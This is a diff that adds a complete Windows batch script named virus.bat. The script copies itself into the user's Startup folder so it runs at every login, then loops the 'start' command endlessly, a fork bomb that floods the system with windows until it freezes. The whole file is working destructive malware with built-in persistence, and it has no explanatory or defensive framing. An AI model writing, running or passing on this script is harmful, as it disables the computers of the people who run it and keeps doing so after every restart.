@@ -1,0 +1,5 @@
+copy virus.bat “%userprofile%\appdata\roaming\microsoft\Windows\Start Menu\Programs\Startup”
+:d
+start
+goto d
+ 
